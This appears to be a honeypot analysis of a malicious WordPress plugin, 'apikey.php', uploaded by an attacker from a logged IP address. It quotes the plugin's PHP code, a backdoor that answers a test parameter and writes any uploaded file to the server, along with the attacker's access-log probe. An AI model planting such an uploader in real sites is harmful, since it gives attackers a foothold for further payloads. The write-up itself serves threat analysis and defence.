# apikey.php - access check

Download of a small PHP file that can (a) check access,
(b) download files to the compromised WordPress host.

## Origin

### IP Address 222.214.69.105

105.69.214.222.broad.ga.sc.dynamic.163data.com.cn does not have an A record in DNS

`whois` says it's owned by a Chinese telecom company:

### Download

Downloaded to my WordPress honey pot via a plugin update: `/wp-admin/update.php?action=upload-plugin`

The PHP file `apikey.php` has this annotation:

    /**
     * @package api key
     */
    /*
    Plugin Name: api key
    */

Is the "api key" name meant to be innocuous? A guick google on "api key wordpress" gives
many, many results.

## Analysis

The same IP address immediately accessed the file so downloaded:

    222.214.69.105 - - [01/Feb/2018:16:44:25 -0700] "GET /wp-content/plugins/apikey/apikey.php?test=hello HTTP/1.1" 200 120 "http://stratigery.com/wp-content/plugins/apikey/apikey.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"

The GET parameters passed in match the code:

    if ("hello"==$_GET["test"])
    {
     echo "testtrue";
    }
    if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
    {
     move_uploaded_file($_FILES["filename"]["tmp_name"],$_FILES["filename"]["name"]);
     echo "true";
    }

The "test=hello" parameter matches one of the two actions in the code. The access of `apikey.php` seems
like a validation test - did `apikey.php` get extracted correctly, and does it execute?

The second action in `apikey.php` is just a file upload service. If some keys in the `$_FILES` PHP superglobal
are set, presumably a file got uploaded, so `apikey.php` moves the file into place.
